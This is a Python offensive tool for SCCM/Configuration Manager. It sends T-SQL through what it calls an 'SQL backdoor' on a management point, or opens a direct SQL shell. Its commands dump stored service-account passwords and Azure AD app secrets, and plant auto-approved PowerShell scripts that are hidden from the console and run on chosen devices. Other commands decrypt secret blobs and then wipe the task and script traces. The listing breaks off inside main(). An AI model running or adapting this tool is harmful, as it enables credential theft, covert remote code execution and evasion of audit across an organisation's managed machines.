#!/usr/bin/env python3

import argparse
import cmd
import logging
import os
import re
import sys
import uuid
import zlib
from base64 import b64decode, b64encode
from binascii import hexlify, unhexlify
from datetime import datetime
from hashlib import sha256
from json import loads
from time import sleep

import requests
import urllib3
from impacket import tds, version
from impacket.examples import logger
from impacket.examples.utils import parse_target
from requests_toolbelt import multipart
from tabulate import tabulate

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def now():
    return datetime.utcnow().strftime("%Y%m%d-%H%M%S")



class SCCM_SQL_HTTP:

    marker = 'X509'

    dummy_package_id = f"UID:{uuid.uuid4()}"

    tpl_multipart = b"--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: text/plain; charset=UTF-16\r\n\r\n%b\r\n--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: application/octet-stream\r\n\r\n%b\r\n--aAbBcCdDv1234567890VxXyYzZ--"

    tpl_msg = f"""<Msg ReplyCompression="zlib" SchemaVersion="1.1"><Body Type="ByteRange" Length="{{LENGTH}}" Offset="0" /><CorrelationID>{{{{00000000-0000-0000-0000-000000000000}}}}</CorrelationID><Hooks><Hook3 Name="zlib-compress" /></Hooks><ID>{{{{00000000-0000-0000-0000-000000000000}}}}</ID><Payload Type="inline"/><Priority>0</Priority><Protocol>http</Protocol><ReplyMode>Sync</ReplyMode><ReplyTo>direct:dummyEndpoint:LS_ReplyLocations</ReplyTo><TargetAddress>mp:[http]{{TARGET_ENDPOINT}}</TargetAddress><TargetEndpoint>{{TARGET_ENDPOINT}}</TargetEndpoint><TargetHost>{{TARGET}}</TargetHost><Timeout>60000</Timeout><SourceID>{{MACHINE_ID}}</SourceID></Msg>"""

    tpl_SiteInformationRequest = """<SiteInformationRequest><SiteCode Name="{SITECODE}" /></SiteInformationRequest>\x00"""

    tpl_stager = """
DECLARE @b NVARCHAR(MAX) = '{BASE64}';
DECLARE @f BIT = {FLAG};
DECLARE @result VARCHAR(MAX) = '';
DECLARE @err VARCHAR(MAX) = '';
DECLARE @s NVARCHAR(MAX) = CAST(dbo.fnConvertBase64StringToBinary(@b) as VARCHAR(MAX));
DECLARE @json VARCHAR(MAX);
DECLARE @bin VARBINARY(MAX);
BEGIN TRY
IF @f = 0
BEGIN
    EXEC (@s);
END
ELSE
BEGIN
    SET @s = N'SET @result=(' + @s + N' FOR JSON PATH)';
    EXEC sp_executesql @s, N'@result VARCHAR(MAX) OUTPUT', @result = @result OUTPUT;
END
END TRY
BEGIN CATCH
    SET @err= ERROR_MESSAGE();
END CATCH 
SET @json = (SELECT @result as rows, @@ROWCOUNT as rc, @err AS err FOR JSON PATH)
SET @result = '<SecurityConfiguration>'+dbo.fnConvertBinaryToBase64String(CONVERT(VARBINARY(MAX), @json))+'</SecurityConfiguration>';
SELECT s.SiteCode, s.Version as Version, s.BuildNumber, @result as Settings, isnull(s.DefaultMP, N'') as DefaultMP, CONVERT(nvarchar(max),s.Capabilities) as Capabilities FROM Sites s
"""


    def __init__(self, target, key, cert, marker="X509", altAuth=False):
        self._target = target
        self._target_url = f"{target}/ccm_system_altauth/request" if altAuth else f"{target}/ccm_system/request"
        self._pkey = key
        self._cert = cert
        self.marker = marker


    def __ccm_post(self, data):
        headers = {"User-Agent": "ConfigMgr Messaging HTTP Sender", "Content-Type": 'multipart/mixed; boundary="aAbBcCdDv1234567890VxXyYzZ"'}
        
        #print(f">>>> HTTP Request <<<<<\n{data.decode('utf-16-le')}\n")
        r = requests.request("CCM_POST", f"{self._target_url}", headers=headers, data=data, verify=False, cert=(self._cert, self._pkey))
        logging.debug(f">>>> Response : {r.status_code} {r.reason} <<<<<\n{r.text[:8000]}\n")
        try:
            multipart_data = multipart.decoder.MultipartDecoder.from_response(r)
            for part in multipart_data.parts:
                if part.headers[b'content-type'] == b'application/octet-stream':
                    deflatedData = zlib.decompress(part.content).decode('utf-16')
                    logging.debug(deflatedData)
        except Exception as e:
            logging.error(e)
            deflatedData = ""
            pass
        return deflatedData


    def __ccm_system_request(self, header, request):
        multipart_body = self.tpl_multipart % (header.encode("utf-16"), zlib.compress(request))

        # print(f">>>> Header <<<<<\n{header}\n")
        logging.debug(f">>>> Request <<<<<\n{request.decode()}\n")

        return self.__ccm_post(multipart_body)

    # MP_GetSiteInfo
    def sql_query(self, sql_query):
        logging.debug(f"SQL QUERY: {sql_query}")
        select_flag = sql_query.lower().startswith('select')
        stager = self.tpl_stager.format(BASE64=b64encode(sql_query.encode()).decode(), FLAG=1 if select_flag else 0)
        # print(stager)
        client_fqdn = f"{self.marker}:{b64encode(stager.encode()).decode()}"
        request_body = self.tpl_SiteInformationRequest.format(SITECODE=client_fqdn)
        request = b"%s\r\n" % request_body.encode('utf-16')[2:]
        header = self.tpl_msg.format(LENGTH=len(request) - 2, TARGET=self._target, TARGET_ENDPOINT="MP_LocationManager", MACHINE_ID=self.dummy_package_id)
        resp = self.__ccm_system_request(header, request)

        r = re.findall("<SecurityConfiguration>([^<]+)</SecurityConfiguration>", resp)
        if len(r):
            match =  r[0]
            logging.debug(f"Got Output")
            output = loads(b64decode(match).decode(encoding='latin1', errors='backslashreplace'))[0]
            logging.debug(output)
            try:
                self.rows = loads(output.get('rows', '[]'))
            except:
                self.rows = []
            self.rowcount = output.get('rc', None)
            self.error = output.get('err', None)
            return self.rows
        else:
            logging.error("Failed to get output in response, SQL backdoor not present or wrong marker")
            return None
        
    def printRows(self):
        print(tabulate(self.rows, headers="keys", tablefmt="grid"))
        self.rows =  []

    def printReplies(self):
        # TODO: handle errors here
        if self.error is not None:
            logging.error(self.error)
            self.error = None

    def disconnect(self):
        pass


class SCCM_SQLSHELL(cmd.Cmd):

    # On MP, the path is different, delete from current location too
    _clean_scriptstore_cmd = 'Remove-Item ./{guid}_*'
    _clean_scriptstore = True


    _crypto_decrypt_useSiteSystemKey = """Add-Type -Path "$env:SMS_LOG_PATH\\..\\bin\\X64\\microsoft.configurationmanager.azureaddiscovery.dll"\n$ss = [Microsoft.ConfigurationManager.AzureADDiscovery.Utilities]::GetDecryptedAppSecretKey("{BLOB}")\n[Microsoft.ConfigurationManager.AzureADDiscovery.Utilities]::ConvertToPlainString($ss)"""

    _crypto_decrypt = """Add-Type -Path "$env:SMS_LOG_PATH\\..\\bin\\X64\\microsoft.configurationmanager.cloudservicesmanager.dll"\n[Microsoft.ConfigurationManager.CloudServicesManager.Utility]::GetCertificateContent("{BLOB}", [ref]$null)"""

    _script_name = 'CMPivot'

    _script_author = 'CM'
    _script_approver = 'CM'

    def __init__(self, SQL, site_code="", show_queries=False, ps1_script=None, clean_scriptstore=True):
        cmd.Cmd.__init__(self)
        self.sql = SQL
        self.show_queries = show_queries
        self.at = []

        self.intro = "[!] Press help for extra shell commands"
        self._limit = 100

        self._last_taskid = None
        self._last_scriptid = None

        self._clean_scriptstore = clean_scriptstore

        # load  SCCM site code
        row = self.sql_query(f"SELECT Name FROM sys.databases WHERE name like 'CM_{site_code}%'")
        try:
            site_code_dbname = row[0]["Name"]
            self._site_code = site_code_dbname.split("CM_")[1]
            logging.info(f"Found SCCM site DB: {site_code_dbname}")
            self.sql_query(f"use CM_{self._site_code}")
            self.sql.currentDB = f"CM_{self._site_code}"
        except:
            logging.error(f"Failed to find an SSCM DB: CM_{site_code}")
            exit(0)

        self.set_prompt()

        self._ps1_script = ps1_script
        self._ps1_script_content = None
        if ps1_script is not None:
            try:
                self._ps1_script_content = open(ps1_script).read()
            except:
                logging.error(f"Failed to load PowerShell script from path {self.ps1_script}")
                exit(0)

    def do_help(self, line):
        print(
            """
    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    show_query                 - show query
    mask_query                 - mask query
    set_limit                  - set top limit [default 100]

    # SCCM
    sccm_sites                 - List Sites

    sccm_devices [Name]
    sccm_devices_bgbstatus [Name]
    sccm_devices_status [Name]


    sccm_run_script [ResourceID]                      - Run PowerShell script on a given device

    sccm_ScriptsExecutionStatus [ScriptGuid | TaskID] - Get the output of script executions
    sccm_BGB_Tasks_clean [GUID]                       - Cleans all traces related to a given task
    
    sccm_useraccounts [UserName]                      - List User Accounts (NAA, ClientPush)
    sccm_add_apps [Name]                              - List Azure AD Application configurations
    sccm_decrypt_blob [ResourceID] [HEXBLOB]          - Run script to decrypt secret blob on a Management Point
    

    show_ps1_script
    set_ps1_script [Content]
    load_ps1_script [filename]

    
    last_task_info          - Print latest task GUIDs
    last_task_output        - Show execution results of the latest Task launched with sccm_run_script
    last_task_output_print  - Pretty print the execution's output
    last_task_clean         - Clean Task and Script of the last sccm_run_script execution

    sccm_set_sitecode [SITE_CODE]

    sccm_scripts [ScriptName | ScriptGuid]
    sccm_scripts_full [ScriptName | ScriptGuid]
    sccm_script_add [ScriptName]
    sccm_script_delete [ScriptGuid]
    sccm_script_printbody [ScriptName | ScriptGuid]

    sccm_BGB_Server [ServerName]

    sccm_BGB_Tasks [GUID]
    sccm_BGB_Task_add [ScriptGuid]
    sccm_BGB_Task_delete [GUID]

    sccm_BGB_ResTask [TaskID]
    sccm_BGB_ResTaskHistory [TaskID]
    sccm_BGB_ResTaskPush [TaskID]
    sccm_BGB_ResTaskPushHistory [TaskID]
    sccm_BGB_ResTaskPushPending [TaskID]

    """
        )

    def postcmd(self, stop, line):
        return stop

    def set_prompt(self):
        try:
            row = self.sql_query('SELECT system_user + SPACE(2) + current_user as "username"', False)
            username_prompt = row[0]["username"]
        except:
            username_prompt = "-"
        if self.at is not None and len(self.at) > 0:
            at_prompt = ""
            for at, prefix in self.at:
                at_prompt += ">" + at
            self.prompt = "SQL [CM_%s] %s  (%s@%s)> " % (self._site_code, at_prompt, username_prompt, self.sql.currentDB)
        else:
            self.prompt = "SQL [CM_%s] (%s@%s)> " % (self._site_code, username_prompt, self.sql.currentDB)

    def do_show_query(self, s):
        self.show_queries = True

    def do_mask_query(self, s):
        self.show_queries = False

    def execute_as(self, exec_as):
        if self.at is not None and len(self.at) > 0:
            (at, prefix) = self.at[-1:][0]
            self.at = self.at[:-1]
            self.at.append((at, exec_as))
        else:
            self.sql_query(exec_as)
            self.sql.printReplies()

    def sql_query(self, query, show=True):
        if self.at is not None and len(self.at) > 0:
            for linked_server, prefix in self.at[::-1]:
                query = "EXEC ('" + prefix.replace("'", "''") + query.replace("'", "''") + "') AT " + linked_server
        if self.show_queries and show:
            logging.info("[%%] %s" % query)
        return self.sql.sql_query(query)

    def do_shell(self, s):
        os.system(s)

    def do_lcd(self, s):
        if s == "":
            print(os.getcwd())
        else:
            os.chdir(s)

    # SCCM CUSTOM
    def __run(self, line):
        try:
            self.sql_query(line)
            self.sql.printReplies()
            self.sql.printRows()
        except:
            pass

    def do_set_limit(self, limit):
        self._limit = limit

    def do_sccm_set_sitecode(self, code):
        self._site_code = code

    def do_sccm_get_sitecode(self, line=""):
        print(self._site_code)

    def do_sccm_sites(self, line=""):
        self.__run(
            f"SELECT SiteNumber, SiteType, SiteName, SiteCode, SiteServerName, SiteServerDomain, SQLServerName, SQLDatabaseName "
            f"FROM CM_{self._site_code}..SC_SiteDefinition "
        )

    def do_sccm_servers(self, line=""):
        self.__run(
            f"SELECT * "
            f"FROM CM_{self._site_code}..ServerData "
        )

    def do_sccm_sysreslist(self, filter=""):
        self.__run(
            f"select ServerName, PublicDNSName, SslState, SiteCode, RoleName "
            f"FROM CM_{self._site_code}..SysResList "
            f"WHERE RoleName LIKE '%{filter}%'"
        )

    def do_sccm_mp(self, line=""):
        self.do_sccm_sysreslist('SMS Management Point')

    def do_sccm_dp(self, line=""):
        self.do_sccm_sysreslist('SMS Distribution Point')

    def do_sccm_devices(self, filter=""):
        self.__run(
            f"SELECT top {self._limit} SYS.ResourceID, Name0 as Name, Resource_Domain_OR_Workgr0 as Domain, SYS.SMS_Unique_Identifier0 as SMSID, STRING_AGG(SYSIP.IP_Addresses0, ',') AS IP, SenseID, Client0 as Client, Decommissioned0 as Decommissioned, SMS_UUID_Change_Date0 as SMSIDChangeDate, User_Name0 as UserName "
            f"FROM CM_{self._site_code}..v_R_SYSTEM AS SYS "
            f"LEFT JOIN CM_{self._site_code}..v_RA_System_IPAddresses AS SYSIP on SYS.ResourceID = SYSIP.ResourceID "
            f"WHERE Name0 LIKE '%{filter}%' OR User_Name0 = '{filter}' OR SYSIP.IP_Addresses0 LIKE '{filter}%' "
            f"GROUP BY SYS.ResourceID, Name0, Resource_Domain_OR_Workgr0, SMS_Unique_Identifier0, SenseID, Client0, Decommissioned0, SMS_UUID_Change_Date0, User_Name0 "
        )

    # BGB/Notification channel status
    def do_sccm_devices_bgbstatus(self, filter=""):
        self.__run(
            f"SELECT top {self._limit} SYS.ResourceID, Name0, OnlineStatus, LastOnlineTime, LastOfflineTime, IPAddress, AccessMP  "
            f"FROM CM_{self._site_code}..v_R_SYSTEM AS SYS "
            f"INNER JOIN CM_{self._site_code}..BGB_ResStatus AS brs on SYS.ResourceID = brs.ResourceID "
            f"WHERE Name0 LIKE '%{filter}%' OR IPAddress LIKE '{filter}%'"
        )

    def do_sccm_devices_status(self, filter=""):
        self.__run(
            f"SELECT top {self._limit} t.* from ("
            f"SELECT distinct(name),MachineId,isClient,isActive,IsApproved,isDecommissioned,LastActiveTime from CM_{self._site_code}..v_CollectionMemberClientBaselineStatus "
            f"WHERE isActive=1 AND Name LIKE '%{filter}%' ) t"
        )

    # get clients with a software installed
    def do_sccm_software_inventory(self, filter=""):
        filters = filter.split(" ")
        self.__run(
            f"SELECT distinct top {self._limit} sis.ResourceID, sis.Name, sp.ProductName, sis.LastSoftwareScan,sis.UserDomain, sis.UserName,sis.OperatingSystem "
            f"FROM CM_{self._site_code}..SoftwareInventory as si "
            f"INNER JOIN CM_{self._site_code}..vSoftwareInventoryStatus as sis on sis.ResourceID = si.ClientId "
            f"INNER JOIN CM_{self._site_code}..v_SoftwareProduct as sp on sp.ProductId = si.ProductID "
            f"WHERE sp.ProductName like '%{filters[0]}%' "
            f"AND sis.Name like '%{filters[1] if len(filters) > 1 else ''}%' "

        )

    # get clients missing a certain software
    def do_sccm_software_inventory_not(self, filter=""):
        filters = filter.split(" ")
        self.__run(
            f"SELECT distinct top {self._limit} sis.ResourceID, sis.Name, sis.LastSoftwareScan,sis.UserDomain, sis.UserName, sis.OperatingSystem "
            f"FROM CM_{self._site_code}..vSoftwareInventoryStatus as sis "
            f"WHERE sis.ResourceID  not in ( select distinct ClientId from CM_{self._site_code}..v_SoftwareProduct as sp "
            f"INNER JOIN CM_{self._site_code}..SoftwareInventory as si ON si.ProductId = sp.ProductID "
            f"WHERE sp.ProductName like '%{filters[0]}%' ) "
            f"AND sis.Name like '%{filters[1] if len(filters) > 1 else ''}%' "
        )


    def do_sccm_scripts(self, filter=""):
        self.__run(
            f"SELECT top {self._limit} ScriptGuid, ScriptName, Author, ApprovalState, Approver, Comment "
            f"FROM CM_{self._site_code}..SCRIPTS "
            f"WHERE ScriptName LIKE '%{filter}%' OR ScriptGuid LIKE '%{filter}%' "
        )

    def do_sccm_scripts_full(self, filter=""):
        self.__run(
            f"SELECT top {self._limit} * "
            f"FROM CM_{self._site_code}..SCRIPTS "
            f"WHERE ScriptName LIKE '%{filter}%' OR ScriptGuid LIKE '%{filter}%'"
        )

    def do_sccm_script_add(self, script_name="", script_guid=None, script_content=None):
        if script_content is None and self._ps1_script_content is not None:
            script_content = self._ps1_script_content
        elif script_content is None:
            logging.error("[!] Empty script content")
        else:
            if script_name == "":
                script_name = self._script_name

            if script_guid is None:
                script_guid = str(uuid.uuid4())

            if self._clean_scriptstore:
                logging.info('Prepending clean ScriptStore command to script')
                script_content = f"{self._clean_scriptstore_cmd.format(guid=script_guid)}\n{script_content}"
            
            script_utf16_hex = hexlify(script_content.encode("utf-16")).decode()
            script_hash = sha256(script_content.encode("utf-16")).hexdigest()
            # ApprovalState = 3 => auto-approve
            # Feature = 1       => Hides it from the Configuration Manager UI (as the built-in CMPivot)
            self.__run(
                f"INSERT INTO CM_{self._site_code}..SCRIPTS "
                "(ScriptGuid, ScriptVersion, ScriptName, Script, ScriptType, Approver, ApprovalState, Feature, Author, LastUpdateTime, ScriptHash, Comment) values "
                f"('{script_guid}',1,'{script_name}', 0x{script_utf16_hex}, 0 , '{self._script_approver}', 3, 1, '{self._script_author}', '', '{script_hash}', '')"
            )
            logging.info(f"New Script added with GUID = {script_guid}")

    def do_sccm_script_delete(self, script_guid):
        # block accidental delete of the built-in CMPivot script
        if script_guid.upper() == '7DC6B6F1-E7F6-43C1-96E0-E1D16BC25C14':
            logging.error("Failed to delete script, GUID matches the built-in CMPivot")
        else:
            self.__run(f"DELETE FROM CM_{self._site_code}..SCRIPTS " f"WHERE ScriptGuid = '{script_guid}'")
            logging.info(f'Done cleaning script {script_guid}')

    def do_sccm_script_printbody(self, filter=""):
        self.sql_query(
            f"SELECT top {self._limit} ScriptName, ScriptGuid,  Script "
            f"FROM CM_{self._site_code}..SCRIPTS "
            f"WHERE (ScriptName LIKE '%{filter}%' OR ScriptGuid LIKE '%{filter}%') AND ScriptGuid != '7DC6B6F1-E7F6-43C1-96E0-E1D16BC25C14' "
        )
        for row in self.sql.rows:
            logging.info(f"Script content: {row['ScriptName']} - {row['ScriptGuid']}")
            try:
                print(unhexlify(row['Script']).decode('utf16'))
            except:
                logging.warning('Failed to pretty print, dumping raw')
                print(row['Script'])


    def do_sccm_BGB_Server(self, filter=""):
        self.__run(
            f"SELECT top {self._limit} ServerID, LastOnlineVersion, ServerName, ConversationID, DBID, ReportTime "
            f"FROM CM_{self._site_code}..BGB_Server "
            f"WHERE ServerName LIKE '%{filter}%'  "
        )

    # BGB_Task
    def do_sccm_BGB_Tasks(self, filter=""):
        self.__run(
            f"SELECT top {self._limit} TaskID, TemplateID, CreateTime, Signature, GUID, Param "
            f"FROM CM_{self._site_code}..BGB_Task "
            f"WHERE GUID LIKE '%{filter}%' or TaskID LIKE '%{filter}%' "
        )

    def do_sccm_BGB_Task_add(self, script_guid, task_guid=None):
        if task_guid is None:
            task_guid = str(uuid.uuid4())

        self.sql_query(f"SELECT ScriptHash, ScriptVersion from CM_{self._site_code}..Scripts WHERE ScriptGuid = '{script_guid}'")
        for row in self.sql.rows:
            script_version = row["ScriptVersion"]
            script_hash = row["ScriptHash"]
            task_param = f"<ScriptContent ScriptGuid='{script_guid}'><ScriptVersion>{script_version}</ScriptVersion><ScriptType>0</ScriptType><ScriptHash ScriptHashAlg='SHA256'>{script_hash}</ScriptHash><ScriptParameters></ScriptParameters><ParameterGroupHash ParameterHashAlg='SHA256'></ParameterGroupHash></ScriptContent>"
            self.__run(
                f"INSERT INTO CM_{self._site_code}..BGB_Task "
                f"(TemplateID, CreateTime, Signature, GUID, Param) VALUES"
                # BGB_TaskTemplate.TemplateID => Request Script Execution
                f"(15, '', NULL, '{task_guid}', '{b64encode(task_param.encode()).decode()}')"
            )
            logging.info(f"New BGB_Task added with GUID = {task_guid}")

    def do_sccm_BGB_Task_delete(self, task_guid):
        self.__run(f"DELETE FROM CM_{self._site_code}..BGB_Task " f"WHERE GUID = '{task_guid}'")

    # BGB_ResTask : the task queue
    def do_sccm_BGB_ResTasks(self, filter=""):
        self.__run(
            f"SELECT top {self._limit} ResourceID, TemplateID, TaskID, Param "
            f"FROM CM_{self._site_code}..BGB_ResTask "
            f"WHERE TaskID LIKE '%{filter}%'"
        )

    # BGB_ResTask : inserting a task will trigger 
    def do_sccm_BGB_ResTasks_add(self, resource_id, task_id):
        self.__run(f"INSERT INTO CM_{self._site_code}..BGB_ResTask " f"VALUES ({resource_id}, 15, {task_id}, N'')")

    def do_sccm_BGB_ResTaskHistory(self, filter=""):
        self.__run(
            f"SELECT top {self._limit} ResourceID, TaskID, State " f"FROM CM_{self._site_code}..BGB_ResTaskHistory " f"WHERE TaskID LIKE '%{filter}%'"
        )

    def do_sccm_BGB_ResTaskPush(self, filter=""):
        self.__run(
            f"SELECT top {self._limit} ResourceID, TaskID, PushID, Status, StatusTime "
            f"FROM CM_{self._site_code}..BGB_ResTaskPush "
            f"WHERE TaskID LIKE '%{filter}%'"
        )

    def do_sccm_BGB_ResTaskPushHistory(self, filter=""):
        self.__run(
            f"SELECT top {self._limit} ResourceID, TaskID, PushID, Status, StatusTime "
            f"FROM CM_{self._site_code}..BGB_ResTaskPushHistory "
            f"WHERE TaskID LIKE '%{filter}%'"
        )

    def do_sccm_BGB_ResTaskPushPending(self, filter=""):
        self.__run(
            f"SELECT top {self._limit} ResourceUid, TaskID, PushID, Status "
            f"FROM CM_{self._site_code}..BGB_ResTaskPushPending "
            f"WHERE TaskID LIKE '%{filter}%'"
        )

    # Script execution output
    def do_sccm_ScriptsExecutionStatus(self, filter_guid="", task_guid=""):
        self.__run(
            f"SELECT top {self._limit} ScriptGuid,TaskID,ResourceID,ScriptExecutionState, ScriptExitCode, ScriptOutput "  # ScriptOutput
            f"FROM CM_{self._site_code}..ScriptsExecutionStatus "
            f"WHERE ScriptGuid LIKE '%{filter_guid}%' OR TaskID LIKE '%{filter_guid}%'"
        )


    def do_sccm_BGB_Tasks_clean(self, task_guid):
        self.__run(f"DELETE FROM CM_{self._site_code}..ScriptsExecutionStatus WHERE TaskID LIKE '%{task_guid}%'")
        self.sql_query(f"SELECT TaskID from CM_{self._site_code}..BGB_Task WHERE GUID = '{task_guid}'")
        for row in self.sql.rows:
            task_id = row["TaskID"]
            logging.info(f"Found TaskID={task_id} for GUID={task_guid}")
            self.__run(f"DELETE FROM CM_{self._site_code}..BGB_ResTask WHERE TaskID = {task_id}")
            self.__run(f"DELETE FROM CM_{self._site_code}..BGB_ResTaskHistory WHERE TaskID = {task_id}")
            self.__run(f"DELETE FROM CM_{self._site_code}..BGB_ResTaskPush WHERE TaskID = {task_id}")
            self.__run(f"DELETE FROM CM_{self._site_code}..BGB_ResTaskPushHistory WHERE TaskID = {task_id}")
            self.__run(f"DELETE FROM CM_{self._site_code}..BGB_ResTaskPushPending WHERE TaskID = {task_id}")
            self.__run(f"DELETE FROM CM_{self._site_code}..BGB_Task WHERE TaskID = {task_id}")
        logging.info(f'Done cleaning BGB Task {task_guid}')


    def do_sccm_run_script(self, resource_id=None):
        if self._ps1_script_content is None:
            logging.error("[!] PowerShell script content is empty, use load_ps1_script or set_ps1_script")
        elif resource_id is None:
            logging.error("Missing ResourceID")
        else:
            script_name = self._script_name
            script_guid = str(uuid.uuid4())
            task_guid = str(uuid.uuid4())
            self._last_taskid = task_guid
            self._last_scriptid = script_guid
            logging.info(f"Generated UUIDs: TaskGUID={task_guid} ScriptGUID={script_guid}")
            self.sql_query(f"SELECT Name0 FROM CM_{self._site_code}..v_R_System WHERE ResourceID = {resource_id}")
            if len(self.sql.rows) == 1:
                logging.info(f"Found target device : ResourceID={resource_id} Name={self.sql.rows[0]['Name0']}")
                self.do_sccm_script_add(script_name, script_guid, self._ps1_script_content)
                self.do_sccm_BGB_Task_add(script_guid, task_guid)
                self.sql_query(f"SELECT TaskID FROM CM_{self._site_code}..BGB_Task WHERE GUID = '{task_guid}'")
                for row in self.sql.rows:
                    task_id = row["TaskID"]
                    logging.info(f"Found TaskID={task_id} for GUID={task_guid}")
                    self.do_sccm_BGB_ResTasks_add(resource_id, task_id)
                # self.do_sccm_BGB_Tasks_clean(task_guid)
                # self.do_sccm_script_delete(script_guid)
            else:
                logging.root(f"Failed to find device with ResourceID={resource_id}!")

    # Script execution helpers
    def do_last_task_clean(self, filter=""):
        if self._last_taskid is None and self._last_scriptid is None:
            logging.error("No Task executed recently")
        else:
            self.do_sccm_BGB_Tasks_clean(self._last_taskid)
            self.do_sccm_script_delete(self._last_scriptid)

    def do_last_task_output(self, filter=""):
        if self._last_taskid is None:
            logging.error("No Task executed recently")
        else:
            self.do_sccm_ScriptsExecutionStatus(self._last_taskid)
    
    def do_last_task_output_print(self, filter=""):
        if self._last_taskid is None:
            logging.error("No Task executed recently")
        else:
            self.sql_query(f"SELECT top {self._limit} ScriptOutput FROM CM_{self._site_code}..ScriptsExecutionStatus WHERE TaskID LIKE '%{self._last_taskid}%'")
            for row in self.sql.rows:
                script_output = row["ScriptOutput"]
                try:
                    print("\n".join(loads(script_output)))
                except:
                    logging.warning('Failed to pretty print, dumping raw')
                    print(script_output.encode('utf-8').decode('unicode_escape'))

    def do_last_task_info(self, filter):
        if self._last_taskid is None and self._last_scriptid is None:
            logging.error("No Task executed recently")
        else:
            logging.info(f"Last Task Identifiers: TaskGUID={self._last_taskid} | ScriptGUID={self._last_scriptid}")


    # Credentials
    def do_sccm_useraccounts(self, filter=""):
        self.__run(f"SELECT top {self._limit} ua.ID, sd.SiteCode, sd.SiteServerName, ua.UserName, ua.Password " 
                   f"FROM CM_{self._site_code}..SC_UserAccount ua " 
                   f"LEFT JOIN CM_{self._site_code}..SC_SiteDefinition sd on ua.SiteNumber = sd.SiteNumber " 
                   f"WHERE ua.UserName LIKE '%{filter}%'")

    def do_sccm_aad_apps(self, filter=""):
        self.__run(f"SELECT top {self._limit} a.ID, t.TenantID, t.Name as TenantName,  a.ClientID, a.Name, a.LastUpdateTime, a.SecretKey, a.SecretKeyForSCP " 
                   f"FROM CM_{self._site_code}..AAD_Application_Ex  a "
                   f"LEFT JOIN CM_{self._site_code}..AAD_Tenant_Ex  t on t.ID = a.TenantDB_ID "
                    f"WHERE a.Name LIKE '%{filter}%'")
        
    def do_sccm_decrypt_blob(self, line=None):
        if line is None or len(line.split(" ")) < 2 :
            logging.error("Missing arguments, user sccm_decrypt_blob [MP ResourceID] [BLOB] ")
            return False
        else:
            # not the best
            # add check that resource_id points to Management Point
            resource_id, blob = line.split(" ")

            if blob.startswith("0C0100"):
                self._ps1_script_content = self._crypto_decrypt.format(BLOB=blob)
            elif blob.startswith("3082"):
                self._ps1_script_content = self._crypto_decrypt_useSiteSystemKey.format(BLOB=blob) 
            else:
                logging.error('Unrecognized blob format')
                return False

            logging.info('Launching decryption script')
            logging.debug(self._ps1_script_content)
            self.do_sccm_run_script(resource_id)
            attempts = 10
            delay = 10
            sleep(delay)
            try:
                for i in range(attempts):
                    self.sql_query(f"SELECT ScriptOutput FROM CM_{self._site_code}..ScriptsExecutionStatus WHERE TaskID LIKE '%{self._last_taskid}%'")
                    if len(self.sql.rows) > 0:
                        for row in self.sql.rows:
                            output = row["ScriptOutput"]
                            if len(output):
                                logging.info('Got an output, printing below')
                                try:
                                    print(output.encode('utf-8').decode('unicode_escape'))
                                except:
                                    print(output)
                            else:
                                logging.warning('Empty Script output — decryption failed, verify if the target Management Point is the one that generated it')
                        break
                    else:
                            logging.info(f'No output, sleeping {delay} seconds, attempt {i+1}/{attempts}')
                            sleep(delay)
            except KeyboardInterrupt:
                logging.error('Cancelled')
            except Exception as e:
                logging.error(f'Failed: {e}')
            finally:
                logging.info('Cleaning')
                self.do_last_task_clean("")



    def default(self, line):
        self.__run(line)

    def emptyline(self):
        pass

    def do_exit(self, line):
        return True

    def do_show_ps1_script(self, line=""):
        print(self._ps1_script_content)

    def do_set_ps1_script(self, line="New-Guid"):
        self._ps1_script_content = line

    def do_load_ps1_script(self, filename):
        try:
            self._ps1_script_content = open(filename).read() 
            logging.info(f"Loaded script from {filename}")
        except Exception as e:
            logging.error("Failed to load PowerShell script")
            logging.error(e)

def main():
    default_marker = "RSA"

    parser = argparse.ArgumentParser(add_help=True, description="SCCM MSSQL client (SSL supported).")

    parser.add_argument("target", action="store", help="[[domain/]username[:password]@]<targetName or address>")
    parser.add_argument("-http", action="store_true", default=False, help="Use HTTP transport (backdoor)")
    parser.add_argument("-port", action="store", default="1433", help="target MSSQL port (default 1433)")
    parser.add_argument("-db", action="store", help="MSSQL database instance (default None)")
    parser.add_argument("-windows-auth", action="store_true", default=False, help="whether or not to use Windows " "Authentication (default False)")
    parser.add_argument("-debug", action="store_true", help="Turn DEBUG output ON")
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument("-show", action="store_true", default=False, help="show the queries")
    parser.add_argument("-file", type=argparse.FileType("r"), help="input file with commands to execute in the SQL shell")
    parser.add_argument(
        "-site", required=False, default="", action="store", help="Force SCCM site code, or it is loaded by checking DB with name CM_<CODE>"
    )
    parser.add_argument("-script", required=False, default=None, action="store", help="SCCM script file")

    group = parser.add_argument_group("authentication")

    group.add_argument("-hashes", action="store", metavar="LMHASH:NTHASH", help="NTLM hashes, format is LMHASH:NTHASH")
    group.add_argument("-no-pass", action="store_true", help="don't ask for password (useful for -k)")
    group.add_argument(
        "-k",
        action="store_true",
        help="Use Kerberos authentication. Grabs credentials from ccache file "
        "(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the "
        "ones specified in the command line",
    )
    group.add_argument("-aesKey", action="store", metavar="hex key", help="AES key to use for Kerberos Authentication " "(128 or 256 bits)")
    group.add_argument(
        "-dc-ip",
        action="store",
        metavar="ip address",
        help="IP Address of the domain controller. If " "ommited it use the domain part (FQDN) specified in the target parameter",
    )
    group.add_argument('-target-ip', action='store', metavar = "ip address",
                    help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                        'This is useful when target is the NetBIOS name and you cannot resolve it')

    group = parser.add_argument_group("HTTP transport via SQL backdoor")
    group.add_argument("-a", "--altauth", action="store_true", required=False, default=False, help="Use the MP's alternate authentication endpoint")
    group.add_argument("-m", "--marker", action="store", required=False, default=default_marker, help="Override marker to trigger the backdoor")


    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()


    logger.init(options.ts)

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password, remoteName = parse_target(options.target)

    if options.http:
        logging.getLogger('chardet.charsetprober').setLevel(logging.INFO)
